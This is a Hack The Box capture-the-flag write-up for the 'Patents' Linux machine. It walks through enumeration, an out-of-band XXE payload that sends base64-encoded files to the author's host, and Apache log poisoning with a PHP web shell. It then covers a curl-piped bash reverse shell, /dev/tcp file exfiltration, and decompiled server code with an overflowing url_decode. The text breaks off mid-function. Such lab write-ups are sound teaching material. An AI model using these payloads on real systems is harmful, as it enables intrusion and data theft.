---
layout: post
title: "Hack The Box - Patents Writeup"
author: Chr0x6eOs
date: "2020-05-16"
subject: "Patents Writeup"
keywords: [HTB, CTF, Hack The Box, Security, Linux, XXE, ROP, Exploitation]
lang: "en"
image:
    path: assets/htb/Patents/logo.png
    width: 300
    height: 300
...

# Overview
![Patents Image](/assets/htb/Patents/patents.png)

[Patents](https://www.hackthebox.eu/home/machines/profile/224) is a hard linux box by [gbyolo](https://www.hackthebox.eu/home/users/profile/36994).


The box starts with web-enumeration, which reveals a that webpage allows docx file upload and parses the document on server-side. This allows out-of-band XXE to leak arbitrary files. After leaking a config file from the server, we find a webpage that is vulnerable to directory-traversal. Using the directory-traversal we can use apache log poisoning to get a shell in the context of www-data. Enumerating the system, we find that we are in a docker environment. After running pspy, we get the password for the root user of the container and can read user.txt.

For root, we find a git repository, which contains source code and a binary for a server. We find that this server is running on port 8888. After reversing the binary, we find that the url-decode function is vulnerable to an overflow. Exploiting the overflow in url-decode we can leak the libc-base and use a simple rop-chain to get a shell as root. After getting root, we have to enumerate the system to find an unmounted disk. After mounting the disk, we get root.txt.


# Information Gathering

## Nmap
Starting of with a nmap to check for open ports.

```bash
root@silence:~# nmap -sC -sV 10.10.10.173
Nmap scan report for 10.10.10.173
Host is up (0.044s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 39:b6:84:a7:a7:f3:c2:4f:38:db:fc:2a:dd:26:4e:67 (RSA)
|   256 b1:cd:18:c7:1d:df:57:c1:d2:61:31:89:9e:11:f5:65 (ECDSA)
|_  256 73:37:88:6a:2e:b8:01:4e:65:f7:f8:5e:47:f6:10:c4 (ED25519)
80/tcp   open  http            Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: MEOW Inc. - Patents Management
8888/tcp open  sun-answerbook?
| fingerprint-strings:
|   Help, LPDString, LSCP:
|_    LFM 400 BAD REQUEST
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8888-TCP:V=7.80%I=7%D=5/13%Time=5EBC2A3B%P=x86_64-pc-linux-gnu%r(LS
SF:CP,17,"LFM\x20400\x20BAD\x20REQUEST\r\n\r\n")%r(Help,17,"LFM\x20400\x20
SF:BAD\x20REQUEST\r\n\r\n")%r(LPDString,17,"LFM\x20400\x20BAD\x20REQUEST\r
SF:\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# Enumeration
The open ports shown are **22**, **80** and **8888**. HTTP is usally the most interesting, so let us check it out first.

## HTTP - Port 80
Going to http://10.10.10.173, we get this webpage.

![Index page](/assets/htb/Patents/webpage-index.png)

Upload patent seems like an interesting endpoint, so let us check this one out.

![Upload patent](/assets/htb/Patents/webpage-upload.png)

The upload page seems quite interesting. It states, that the uploaded docx document will be converted into a pdf. Server-side file-parsing can be dangerous! After a bit of research, I found a [great document](https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf) showcasing an XXE vulnerability with file-parsing.

### Verifying XXE
In order for us to verify the XXE, we first create a docx document with a malicious xml file.
We can download a sample docx document from [here](https://file-examples.com/index.php/sample-documents-download/sample-doc-download/).

```bash
root@silence:~/extracted# unzip ../sample.docx
Archive:  ../sample.docx
  inflating: [Content_Types].xml
  inflating: _rels/.rels
  inflating: word/document.xml
  inflating: word/_rels/document.xml.rels
  inflating: word/theme/theme1.xml
  inflating: word/settings.xml
  inflating: word/styles.xml
  inflating: word/webSettings.xml
  inflating: word/fontTable.xml
  inflating: docProps/core.xml
  inflating: docProps/app.xml
root@silence:~/extracted# mkdir customXml
```
We extract the docx document and add a customXml folder.

```bash
root@silence:~/extracted/customXml# cat item1.xml
<?xml version="1.0" ?>
<!DOCTYPE xxe [
<!ENTITY % ext SYSTEM "http://10.10.14.5/ext.dtd">
  %ext;
]>
<xxe></xxe>
```
We can now create a malicious xml file, which if the target is vulnerable, should connect to our machine, requesting the ext.dtd file.

```bash
root@silence:~/extracted# zip -r ../xxe-test.docx *
  adding: [Content_Types].xml (deflated 74%)
  adding: customXml/ (stored 0%)
  adding: customXml/item1.xml (deflated 8%)
  adding: docProps/ (stored 0%)
  adding: docProps/core.xml (deflated 52%)
  adding: docProps/app.xml (deflated 50%)
  adding: _rels/ (stored 0%)
  adding: _rels/.rels (deflated 61%)
  adding: word/ (stored 0%)
  adding: word/_rels/ (stored 0%)
  adding: word/_rels/document.xml.rels (deflated 71%)
  adding: word/styles.xml (deflated 90%)
  adding: word/webSettings.xml (deflated 56%)
  adding: word/settings.xml (deflated 64%)
  adding: word/fontTable.xml (deflated 69%)
  adding: word/document.xml (deflated 73%)
  adding: word/theme/ (stored 0%)
  adding: word/theme/theme1.xml (deflated 80%)
```
We now put the whole file back together and upload it.

```bash
root@silence:~# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.173 - - [13/May/2020 19:40:54] code 404, message File not found
10.10.10.173 - - [13/May/2020 19:40:54] "GET /ext.dtd HTTP/1.0" 404 -
```
After uploading we get a response back from the server. With this we have successfully verified XXE and can start exploiting.

# Initial foothold
With the XXE verified, we can exploit the XXE to read arbitrary files from the system.

## Exploiting OOB-XXE
After researching a bit more, I found an [article](https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/) that explains out-of-band XXE data exfiltration. It seems like we exploit the external DTD to exfiltrate files from the server. As we may want to read php files, we also use PHP-filters. [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE Injection#xxe-oob-with-dtd-and-php-filter) has a good payload we can use for that.

### Verifying file-read
In order to get file-read we have to modify our current payload, to load the DTD from our server, which then leaks files from the server.
```bash
root@silence:~/extracted/customXml# cat item1.xml
<?xml version="1.0" ?>
<!DOCTYPE xxe [
<!ENTITY % ext SYSTEM "http://10.10.14.5/ext.dtd">
  %ext;
  %file;
]>
<xxe>&exfil;</xxe>
```
The XXE now gets the ext.dtd file, which contains the file entity, which again contains the exfil entity. We now update the docx file and upload it again.

```bash
root@silence:~# cat ext.dtd
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % file "<!ENTITY exfil SYSTEM 'http://10.10.14.5/DATA?%data;'>">
```
The ext.dtd with the file code to exfiltrate /etc/passwd, by using the php-filter to base64 encode the file and then send the base64 data back to our server.

```bash
root@silence:~# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.173 - - [13/May/2020 19:58:17] "GET /ext.dtd HTTP/1.0" 200 -
10.10.10.173 - - [13/May/2020 19:58:17] code 404, message File not found
10.10.10.173 - - [13/May/2020 19:58:17] "GET /DATA?cm9vdDp[...]L2Jhc2gK HTTP/1.0" 404 -
```
Uploading the new docx document, we get base64 data returned as a response.

```bash
root@silence:~# echo -n "cm9vd...Jhc2gK" | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
gbyolo:x:1000:1000::/home/gbyolo:/bin/bash
```
Base64 decoding the data, we indeed get the /etc/passwd from the server as a response.

### Leaking config.php
Now that we have file-read, let us use gobuster and try to find any interesting file we can leak using this vulnerability.
```bash
root@silence:~# gobuster dir -u http://10.10.10.173 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.173
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/05/13 20:01:07 Starting gobuster
===============================================================
/index (Status: 200)
/profile (Status: 200)
/uploads (Status: 301)
/static (Status: 301)
/upload (Status: 200)
/upload.php (Status: 200)
/release (Status: 301)
/vendor (Status: 301)
/config.php (Status: 200)
/patents (Status: 301)
```
Config.php seems interesting, so let try to leak the contents of this file.

```bash
root@silence:~# cat ext.dtd
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=config.php">
<!ENTITY % file "<!ENTITY exfil SYSTEM 'http://10.10.14.5/DATA?%data;'>">
```
In order to leak config.php, we simply have to change the file to read in the ext.dtd file.

```bash
10.10.10.173 - - [13/May/2020 20:03:24] "GET /DATA?PD9waH[...]Cj8+Cgo= HTTP/1.0" 404 -

root@silence:~# echo -n "PD9waH[...]Cj8+Cgo=" | base64 -d
<?php
# needed by convert.php
$uploadir = 'letsgo/';

# needed by getPatent.php
# gbyolo: I moved getPatent.php to getPatent_alphav1.0.php because it's vulnerable
define('PATENTS_DIR', '/patents/');
?>
```
Base64 decoding the received data, we get find a new interesting file, we could try to access: getPatent_alphav1.0.php.

## Path-traversal to RCE
Going to getPatent_alphav1.0.php, we get a webpage, where we seem to be able to read patents by supplying the id parameter. Using the same technique as before, we can leak the source code of getPatent_alphav1.0.php in order to analyze it. Sadly, this does not work as expected for some reason. Supplying ids gives us different output, but nothing too interesting.

![Get patents](/assets/htb/Patents/webpage-getpatent.png)

After a bit of playing around, I was able to bypass the filter and got to read /etc/passwd.

![LFI /etc/passwd](/assets/htb/Patents/webpage-lfi.png)

In order for us to get code-execution, we can use log-poisoning of the apache2 access log. For this, we can change our user-agent to any php-code. This php-code will then be written into the access.log file, where it will be interpreted once we exploit the directory-traversal.
```bash
root@silence:~# curl "http://10.10.10.173/getPatent_alphav1.0.php?id=....//....//....//....//....//var/log/apache2/access.log" -H 'User-Agent: <?php system($_GET['cmd']); ?>'
```
Using curl, we can poison the apache2 log. Now the access.log file contains our user-agent, which allows us to execute arbitrary commands by supplying the cmd GET parameter.

![RCE via log-poisoning](/assets/htb/Patents/webpage-logpoison-rce.png)

We now have RCE on the server in the context of www-data. Let us get a shell next.

In order to get a shell, we simply let the server download and execute a bash reverse-shell, that we will host on our machine.
```bash
root@silence:~# cat shell.sh
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'
```
We can now trigger the reverse-shell by sending `curl 10.10.14.15/shell.sh|bash` as a cmd parameter.

```http
http://10.10.10.173/getPatent_alphav1.0.php?id=....//....//....//....//....//var/log/apache2/access.log&cmd=curl+10.10.14.5/shell.sh|bash
```
```bash
root@silence:~# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.173 - - [13/May/2020 20:28:12] "GET /shell.sh HTTP/1.1" 200 -
```
We get a shell as www-data returned.
```bash
root@silence:~# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.173.
Ncat: Connection from 10.10.10.173:54904.
bash: cannot set terminal process group (9): Inappropriate ioctl for device
bash: no job control in this shell
www-data@8d8f7bbd30e4:/var/www/html/docx2pdf$
```

# Privesc to user
Now that we have a shell on the system as www-data, let us upgrade our shell and enumerate the system as www-data.

```bash
www-data@8d8f7bbd30e4:/var/www/html/docx2pdf$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<pdf$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@8d8f7bbd30e4:/var/www/html/docx2pdf$ ^Z
[1]+  Stopped                 nc -lnvp 443
root@silence:~/# stty raw -echo
root@silence:~/# nc -lnvp 443
www-data@8d8f7bbd30e4:/var/www/html/docx2pdf$ export TERM=xterm
```
Now that we have a fully working shell, let us enumerate the system.

## Enumeration as www-data
Right off the bat, I noticed the strange looking hostname, which could suggest that we are in a docker container.
```bash
www-data@8d8f7bbd30e4:/$ ls -alh
total 88K
drwxr-xr-x   1 root root 4.0K May 13 18:23 .
drwxr-xr-x   1 root root 4.0K May 13 18:23 ..
-rwxr-xr-x   1 root root    0 May 13 18:23 .dockerenv
```
Checking the root directory, we indeed seem to be in a docker container. After some basic linux enumeration, which did not lead anywhere, I decided to upload [pspy](https://github.com/DominicBreuker/pspy) to the box and check if there are any interesting processes running.

```bash
www-data@8d8f7bbd30e4:/tmp$ ./pspy
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░                                                                                                                                                                                                       
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2020/05/13 18:37:37 CMD: UID=0    PID=9      | /bin/sh /usr/sbin/apachectl -D FOREGROUND
[...]
2020/05/13 18:38:01 CMD: UID=0    PID=172    | /bin/sh -c env PASSWORD="!gby0l0r0ck\$\$!" /opt/checker_client/run_file.sh
```
Running pspy, we seem to have a password in the environment variable PASSWORD.

```bash
www-data@8d8f7bbd30e4:/tmp$ su
Password: !gby0l0r0ck$$!
root@8d8f7bbd30e4:/tmp#
```
Using the found password we can su to root of the docker container and read user.txt.
```bash
root@8d8f7bbd30e4:/home/gbyolo# cat user.txt
79375***************************
```

# Privesc to root
Now that we are root of the docker container, we need to find a way to break out of the container.

## Enumeration as user
After a bit of enumeration, I tried to find any git repositories.
```bash
root@8d8f7bbd30e4:/# find / -name .git 2>/dev/null
/usr/src/lfm/.git
```
And I indeed it seems like we have some interesting files.

### Enumeration of the git repo
```bash
root@8d8f7bbd30e4:/usr/src/lfm/.git# git log --diff-filter=D --summary
commit 7c6609240f414a2cb8af00f75fdc7cfbf04755f5 (HEAD -> master)
Author: gbyolo <gbyolo.htb>
Date:   Mon May 20 17:04:37 2019 +0200

    Removed meow files. THIS REPOSITORY IS ON SVN

 delete mode 100644 README
 delete mode 100755 lfmserver

commit aa139d6caea2182c73341919150d9f5cd05e7468
Author: gbyolo <gbyolo@htb>
Date:   Mon Mar 11 09:39:39 2019 +0100

    Switched to SVN for repository hosting. This will be empty

 delete mode 100644 Makefile
 delete mode 100644 README
 delete mode 100644 arg_parsing.c
 delete mode 100644 arg_parsing.h
 delete mode 100644 file.c
 delete mode 100644 file.h
 delete mode 100644 files/try
 delete mode 100644 lfm.c
 delete mode 100644 lfm.h
 delete mode 100644 lfmserver.c
 delete mode 100644 lfmserver.conf
 delete mode 100644 lfmserver.h
 delete mode 100644 log.c
 delete mode 100644 log.h
 delete mode 100644 md5.c
 delete mode 100644 md5.h
 delete mode 100644 params_parsing.c
 delete mode 100644 params_parsing.h
 delete mode 100644 process.c
 delete mode 100644 process.h
 delete mode 100644 socket_io.c
 delete mode 100644 socket_io.h
 delete mode 100644 thread.c
 delete mode 100644 thread.h
```
Using git log, we can see past commits. Seems like the files were deleted… Luckily, we can easily recover them. We want to recover the lfmserver, as well as the source.

We can transfer the whole git repository to our machine, by archiving it and then sending it to our machine.

```bash
root@8d8f7bbd30e4:/usr/src# tar -czf lfm.tar.gz lfm/
root@8d8f7bbd30e4:/usr/src# cat lfm.tar.gz > /dev/tcp/10.10.14.5/1234

root@silence:~# nc -lvnp 1234 > lfm.tar.gz
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.10.173.
Ncat: Connection from 10.10.10.173:39164.
root@silence:~# tar -xzf lfm.tar.gz
```
```bash
root@silence:~/lfm# git checkout 1bbc518518cdde0126103cd4c6e7e6dfcdd36d3e
root@silence:~/lfm# cat README
This is an implementation of the Lightweight File Manager LFM Protocol.
It's a pre-fork and pre-thread server, which supports re-forking and re-threading
when the number of child processes of threads goes below a threshold.

It's similar to HTTP, and supports the following methods:

GET /object LFM     [\r\n]
User=user           [\r\n]
Password=password   [\r\n]
                    [\r\n]

CHECK /object LFM   [\r\n]
User=user           [\r\n]
Password=password   [\r\n]
                    [\r\n]
md5_of_the_file     [\r\n]
                    [\r\n]


PUT /object LFM     [\r\n]
User=user           [\r\n]
Password=password   [\r\n]
                    [\r\n]
bytes_of_the_file


Communication is based on TCP.
Default port is 5000.
```
Going through the repository, we can find a README, that explains how the protocol works. If we remember back to our nmap scan, there was port 8888 open. We can check if the protocol is running on that port by quickly connecting to it.
```bash
root@silence:~# nc 10.10.10.173 8888
A
LFM 400 BAD REQUEST
```
Further checking out the repository, we find the used libc version, which is [libc6 2.28-0ubuntu1](https://launchpad.net/ubuntu/cosmic/amd64/libc6/2.28-0ubuntu1).
```bash
root@silence:~/lfm# git checkout a900ccf7ae75b95db5f2d134d80e359a795e0cc6
root@silence:~/lfm# git show
commit 7c6609240f414a2cb8af00f75fdc7cfbf04755f5 (HEAD, master)
Author: gbyolo <gbyolo.htb>
Date:   Mon May 20 17:04:37 2019 +0200

    Removed meow files. THIS REPOSITORY IS ON SVN

diff --git a/README b/README
deleted file mode 100644
index 3c770da..0000000
--- a/README
+++ /dev/null
@@ -1,12 +0,0 @@
-lfmserver' dynamic libraries:
-        linux-vdso.so.1 (0x00007ffda19f0000)
-        libm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007f5444090000)
-        libcrypto.so.1.1 => /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1 (0x00007f5443dc5000)
-        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f5443da4000)
-        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5443bba000)
-        /lib64/ld-linux-x86-64.so.2 (0x00007f5444226000)
-        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f5443bb4000)
-
-NB: lfmserver was compiled against:
-- libc6: 2.28-0ubuntu1
-- libssl1.1: 1.1.1-1ubuntu2.1
```
This is definitely important information that we can use later once we exploit the binary.

## Reversing lfmserver
Now that we have recovered the necessary files, let us check both the binary and the source code for any interesting information.

```c
root@silence:~/lfm# cat lfm.c
#include "lfm.h"

[...]

void url_decode(char* src, char* dest, int max) {
    // TODO: implement
}
root@silence:~/lfm# grep -rni todo
lfm.c:10:    // TODO: implement
lfm.c:315:   // TODO: implement
lfm.c:323:   // TODO: implement
lfm.c:344:   // TODO: implement
```
Going through the sources code, we can find a couple of TODO notes.
We can use the makefile and compile the lfmserver ourself.

```bash
root@silence:~/lfm# md5sum lfmserver
a70cfd150c0a999fc28daf370d689b16  lfmserver
root@silence:~# md5sum lfmserver
bc2dbf9842cdf1a5e46737a9f47f8c5b  lfmserver
```
The compiled server differs from the github one. It could be that the server on the docker host has these TODO functions implemented. Let us open the file in ghidra nad analyze it, to see if any changes were implemented.

The whole next section will be the decompiled code from ghidra matched with the source code. The complete ghidra project can be found on my [Github](https://github.com/chr0x6eos/HTB/blob/master/Patents/lfmserver-decompiled.gzf).

### main function (FUN_004055c2)
```c
void main(int argc,char argv[])
{
  uint socketfd;
  int setsockopt_res;
  int bind_res;
  int listen_res;
  int p;
  ulong logfile;
  protoent *protocol;
  int *piVar1;
  char *pcVar2;
  uint *puVar3;
  ulong accept_sem_id;
  int n_child-alive_children;
  undefined7 in_register_00000031;
  double rounded_percentage;
  undefined8 config_file [8];
  undefined8 *argv;
  undefined4 reuse_addr;
  sa_family_t addr;
  char *logfilename;
  uint p1;
  uint port;

  argv = (undefined8 *)CONCAT71(in_register_00000031,argv[]);
  p1 = 0;
  logfilename = PTR_s_lfmserver.log_00409298;
  reuse_addr = 1;
  if (argc == 2) {
    check_option(*argv,(char *)argv[1],(char *)0x0,(int *)0x0,(char **)0x0);
  }
  else {
    if (argc == 3) {
      check_option(*argv,(char *)argv[1],(char *)argv[2],(int *)&p1,&logfilename);
    }
    else {
      if (argc == 5) {
        check_option(*argv,(char *)argv[1],(char *)argv[2],(int *)&p1,&logfilename);
        check_option(*argv,(char *)argv[3],(char *)argv[4],(int *)&p1,&logfilename);
      }
      else {
        if (((argc == 2) || (argc == 4)) || (5 < argc)) {
          fprintf(stderr,"Usage: %s [-p port_number] [-l logfilename.log]\n",*argv);
                    /* WARNING: Subroutine does not return */
          exit(1);
        }
      }
    }
  }
  logfile = openfile_low(logfilename,0x241,0x1a4);
  logfile = (int)logfile;
  redirect(2,logfile);
  log_init("lfmserver");
  parse_config_file(config_file,config_file);
  if (p1 == 0) {
    port = (uint)param_config.port;
  }
  else {
    port = p1;
  }
  N_CHILD = (uint)param_config.nums_of_children;
  perc_dead_child = DAT_00409288._4_4_;
  system_log(6,"Server starting on port %d. Logfile = %s\nNumber of children: %d\n",(ulong)port,
             logfilename,(ulong)(uint)param_config.nums_of_children);
  system_log((double)perc_dead_child,6,"perc_dead_child: %f\n");
  protocol = getprotobyname("tcp");
  if (protocol == (protoent *)0x0) {
    fwrite("ERROR getting tcp protocol number \n",1,0x23,stdout);
    piVar1 = __errno_location();
    pcVar2 = strerror(*piVar1);
    system_log(3,"ERROR in getting tcp protocol number (%s)\n",pcVar2);
    closefile_low(logfile);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  socketfd = socket(2,1,protocol->p_proto);
  if (socketfd == 0xffffffff) {
    puVar3 = (uint *)__errno_location();
    fprintf(stdout,"ERROR creating socket. errno = %d \n",(ulong)*puVar3);
    piVar1 = __errno_location();
    pcVar2 = strerror(*piVar1);
    system_log(3,"ERORR creating socket (%s)\n",pcVar2);
    closefile_low(logfile);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  system_log(7,"socket created (fd=%d) \n",(ulong)socketfd);
  setsockopt_res = setsockopt(socketfd,1,2,&reuse_addr,4);
  if (setsockopt_res == -1) {
    puVar3 = (uint *)__errno_location();
    fprintf(stdout,"ERROR re-using socket. errno = %d \n",(ulong)*puVar3);
    piVar1 = __errno_location();
    pcVar2 = strerror(*piVar1);
    system_log(3,"ERROR in setting SO_REUSEADDR option (%s)\n",pcVar2);
    closefile_low(logfile);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  memset(&addr,0,0x10);
  addr = 2;
  htonl(0);
  htons((uint16_t)port);
  bind_res = bind(socketfd,(sockaddr *)&addr,0x10);
  if (bind_res == -1) {
    puVar3 = (uint *)__errno_location();
    fprintf(stdout,"ERROR in bind. errno = %d \n",(ulong)*puVar3);
    piVar1 = __errno_location();
    pcVar2 = strerror(*piVar1);
    system_log(3,"ERROR in bind() (%s)\n",pcVar2);
    closefile_low(logfile);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  system_log(7,"socket bind() OK\n");
  listen_res = listen(socketfd,0x80);
  if (listen_res != -1) {
    system_log(7,"listen() went ok. BACKLOG=%d\n",0x80);
    accept_sem_id = init_sem(socketfd);
    sem_id = (undefined4)accept_sem_id;
    spawn_children(socketfd,N_CHILD);
    install_sigchld_handler(socketfd);
    do {
      while ((p = pause(), p == -1 && (piVar1 = __errno_location(), *piVar1 == 4))) {
        system_log(4,"One child is dead\n");
        n_child-alive_children = N_CHILD - DAT_00409380;
        rounded_percentage = floor((double)(perc_dead_child * (float)N_CHILD));
        if ((int)rounded_percentage <= n_child-alive_children) {
          system_log(6,"Re-forking %d processes\n",(ulong)(N_CHILD - DAT_00409380));
          spawn_children(socketfd,N_CHILD - DAT_00409380);
        }
      }
      puVar3 = (uint *)__errno_location();
      fatal_error(socketfd,"ERROR in pause()",*puVar3);
    } while( true );
  }
  puVar3 = (uint *)__errno_location();
  fprintf(stdout,"ERROR in listen. errno = %d \n",(ulong)*puVar3);
  piVar1 = __errno_location();
  pcVar2 = strerror(*piVar1);
  system_log(3,"ERROR in listen (%s)\n",pcVar2);
  closefile_low(logfile);
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

Going through the source, I eventually found code that was not implemented in the source code, by going through the functions like this: Main --> spawn_children --> child_work --> create_new_thread --> thread_work --> handle_lfm_connection --> **handle_check** --> **url_decode**.

### handle_check function (FUN_00403ad9)
After following through the code function by function I finally came to code that was clearly different to the leaked source code. Whilst the leaked source only contained a "//TODO implement", the ghidra disassembly showed quite more output.

Source code:
```c
int handle_check(struct msg *message)
{
    // TODO: implement

	send_401(message->connsd);
	return -1;
}
```

```c
void handle_check(uint *message)
{
  uint uVar1;
  int user_ok;
  int pw_ok;
  int file_ok;
  int iVar2;
  int res_send_header;
  size_t sVar3;
  char *__s1;
  ulong uVar4;
  uint **__s;
  undefined8 uVar5;
  uint *apuStack192 [3];
  char filename [128];

  apuStack192[2] = message;
  if ((*(long *)(message + 0x14) != 0) && (apuStack192[2] = message, *(long *)(message + 0x16) != 0)
     ) {
    apuStack192[0] = (uint *)0x403b30;
    apuStack192[2] = message;
    user_ok = strcmp(*(char **)(message + 0x14),lfmserver_user);
    if (user_ok == 0) {
      apuStack192[0] = (uint *)0x403b55;
      pw_ok = strcmp(*(char **)(apuStack192[2] + 0x16),!gby0l0r0ck$$!);
      if (pw_ok == 0) {
        apuStack192[0] = (uint *)0x403b70;
        sVar3 = strlen(*(char **)(apuStack192[2] + 0xc));
        apuStack192[0] = (uint *)0x403b92;
        url_decode(*(char **)(apuStack192[2] + 0xc),filename,(int)sVar3 + 1);
        apuStack192[0] = (uint *)0x403ba6;
        file_ok = access(filename,4);
        if (file_ok == -1) {
          apuStack192[0] = (uint *)0x403bcb;
          system_log(6,"404 NOT FOUND: %s\n",filename);
          apuStack192[0] = (uint *)0x403bdb;
          send_404(*apuStack192[2]);
          apuStack192[0] = (uint *)0x403bfb;
          (*DAT_00409430)((ulong)*apuStack192[2],"file does not exist [HEAD]",0,
                          (ulong)*apuStack192[2]);
          return;
        }
        apuStack192[0] = (uint *)0x403c14;
        __s1 = md5sum(filename);
        if (__s1 == (char *)0x0) {
          apuStack192[0] = (uint *)0x403c2f;
          send_500(*apuStack192[2]);
          return;
        }
        uVar5 = *(undefined8 *)(apuStack192[2] + 0xc);
        *(undefined8 *)(apuStack192[2] + 0xc) = 0;
        apuStack192[0] = (uint *)0x403c71;
        iVar2 = strcmp(__s1,*(char **)(apuStack192[2] + 6));
        if (iVar2 != 0) {
          apuStack192[0] = (uint *)0x403d7c;
          system_log(6,"406 MD5 NOT MATCH: %s\n",uVar5);
          apuStack192[0] = (uint *)0x403d93;
          send_406(*apuStack192[2],__s1);
          return;
        }
        apuStack192[0] = (uint *)0x403c97;
        res_send_header = send_header(200_OK,apuStack192[2]);
        if (res_send_header == -1) {
          return;
        }
        apuStack192[0] = (uint *)0x403cb2;
        sVar3 = strlen(__s1);
        uVar4 = (sVar3 + 0x1c) / 0x10;
        __s = apuStack192 + uVar4 * 0x1ffffffffffffffe + 2;
        apuStack192[uVar4 * 0x1ffffffffffffffe] = 0x403cf9;
        sVar3 = strlen(__s1,*(undefined *)(apuStack192 + uVar4 * 0x1ffffffffffffffe));
        apuStack192[uVar4 * 0x1ffffffffffffffe] = 0x403d1c;
        snprintf((char *)__s,sVar3 + 4,"%s\r\n\r\n",__s1);
        apuStack192[uVar4 * 0x1ffffffffffffffe] = 0x403d28;
        sVar3 = strlen(__s,*(undefined *)(apuStack192 + uVar4 * 0x1ffffffffffffffe));
        uVar1 = *apuStack192[2];
        apuStack192[uVar4 * 0x1ffffffffffffffe] = 0x403d42;
        uVar5 = write_message(uVar1,__s,sVar3,
                              *(undefined *)(apuStack192 + uVar4 * 0x1ffffffffffffffe));
        if ((int)uVar5 != -1) {
          return;
        }
        apuStack192[uVar4 * 0x1ffffffffffffffe] = 0x403d58;
        log_info("Couldn\'t send md5sum [handle_check]");
        return;
      }
    }
  }
  apuStack192[0] = (uint *)0x403db1;
  send_401(*apuStack192[2]);
  return;
}
```
The handle check function calls the `url_decode` function, using a 128 byte large buffer.

### url_decode (FUN_00402db9)
The url_decode function is vulnerable and can be used to overflow the 128 byte buffer.
```c
void url_decode(char *src,char *dest,int max)
{
  ulong res;
  int local_max;
  char *local_dest;
  undefined2 nptr;
  undefined local_11;
  undefined2 *local_src;

  local_11 = 0;
  local_max = max;
  local_dest = dest;
